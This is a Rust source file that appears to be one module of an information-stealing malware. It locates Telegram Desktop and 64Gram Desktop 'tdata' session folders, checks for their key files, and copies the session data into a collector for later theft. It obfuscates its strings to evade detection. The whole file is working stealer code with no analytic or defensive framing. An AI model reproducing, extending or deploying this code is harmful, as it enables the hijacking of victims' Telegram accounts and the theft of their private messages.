use alloc::borrow::ToOwned;
use alloc::vec;
use collector::{Collector, Software};
use obfstr::obfstr as s;
use tasks::Task;
use utils::path::Path;

pub(super) struct TelegramTask;

impl<C: Collector> Task<C> for TelegramTask {
    fn run(&self, parent: &Path, collector: &C) {
        let appdata = &Path::appdata();
        let paths = [
            (s!("Telegram Desktop").to_owned(), appdata / s!("Telegram Desktop") / s!("tdata")),
            (s!("64Gram Desktop").to_owned(), appdata / s!("64Gram Desktop") / s!("tdata")),
        ];
        
        for (client, tdata_path) in paths {
            if tdata_path.is_exists() {
                let dst = parent / client;
                copy_tdata(&tdata_path, &dst, collector);
            }
        }
    }
}

fn copy_tdata<C>(tdata: &Path, dst: &Path, collector: &C)
where
    C: Collector
{
    if !(tdata / s!("key_datas")).is_exists() {
        return
    }
    
    let mut contents = vec![];
    let mut files = vec![];
    let mut dirs = vec![];
    
    if let Some(list_files) = tdata.list_files() {
        for path in list_files {
            if path.is_file() {
                files.push(path);
            } else if path.is_dir() {
                dirs.push(path);
            }
        }
    }
    
    for file in &files {
        for dir in &dirs {
            if dir.name().unwrap().to_owned() + "s" == file.name().unwrap() {
                contents.push(file);
                contents.push(dir);
            }
        }
    }

    if !contents.is_empty() {
        collector.get_software().set_telegram();
    }
    
    for path in contents {
        if path.is_file() {
            let _ = path.copy_file(dst, true);
        } else if path.is_dir() {
            let _ = path.copy_folder(dst);
        }
    }
}